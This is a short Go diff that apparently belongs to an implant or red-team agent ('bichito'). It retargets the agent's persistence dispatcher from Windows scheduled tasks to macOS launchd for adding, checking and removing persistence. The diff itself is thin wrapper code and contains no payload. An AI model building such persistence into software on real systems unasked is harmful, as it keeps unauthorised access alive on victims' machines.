@@ -1,15 +1,16 @@
-// +build schtasks
+// +build launchd
+
 
 package persistence
 
 import (
-	"bichito/modules/persistence/windows_schtasks"
-)
+	"bichito/modules/persistence/osx_launchd"
 
+)
 
 func AddPersistence(jsonPersistence string,blob string) (bool,string){
 
-	err,result := windows_schtasks.AddPersistenceSchtasks(jsonPersistence,blob)
+	err,result := osx_launchd.AddPersistenceLaunchd(jsonPersistence,blob)
 	if err != false {
 		return true,result
 	}
@@ -19,7 +20,7 @@ func AddPersistence(jsonPersistence string,blob string) (bool,string){
 
 func CheckPersistence(jsonPersistence string) (bool,string){
 
-	err,result := windows_schtasks.CheckPersistenceSchtasks(jsonPersistence)
+	err,result := osx_launchd.CheckPersistenceLaunchd(jsonPersistence)
 	if err != false {
 		return true,result
 	}
@@ -30,7 +31,7 @@ func CheckPersistence(jsonPersistence string) (bool,string){
 
 func RemovePersistence(jsonPersistence string) (bool,string){
 
-	err,result := windows_schtasks.RemovePersistenceSchtasks(jsonPersistence)
+	err,result := osx_launchd.RemovePersistenceLaunchd(jsonPersistence)
 	if err != false {
 		return true,result
 	}
